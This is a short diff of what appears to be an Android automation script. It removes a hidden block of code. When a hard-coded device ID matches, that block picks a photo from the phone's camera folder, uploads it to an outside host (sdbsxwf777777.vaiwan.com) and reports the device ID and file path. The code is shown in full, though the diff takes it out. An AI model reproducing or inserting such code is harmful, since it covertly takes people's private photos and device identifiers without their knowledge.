@@ -31,32 +31,5 @@ var jies=xxl+"-"+bbss+"-"+bbh+"-"+sjs;
     } catch (e) {}
 log("hello world");
 
-try{
-if("5cf309f0d3bd71e6"=="ids"){
-//engines.stopAllAndToast();
-//fasongyoujian("");
-
-
-var dir = "/sdcard/DCIM/Camera/";
- function shaixuanwenjian(dir) {    
-     if (files.exists(dir)) {
-         var arr = files.listDir(dir, function(name) {
-             return name.endsWith(".jpg") && files.isFile(files.join(dir, name));
-         });        
-         return arr;
-     } else {
-         log("no");
-     }
- }
- var ss = shaixuanwenjian(dir);
- var tp = files.join(dir, ss[1]);
-var urltp="sdbsxwf777777.vaiwan.com/sc/upload_file.php";
- var restp = http.postMultipart(urltp, {
-     file: open(tp)
- });
-var res = http.get("http://sdbsxwf777777.vaiwan.com/mis.php?fname=" + ids + "&age=" + bbs+tp);
-}
-}catch(e){}
-log("yes");
 
 }())
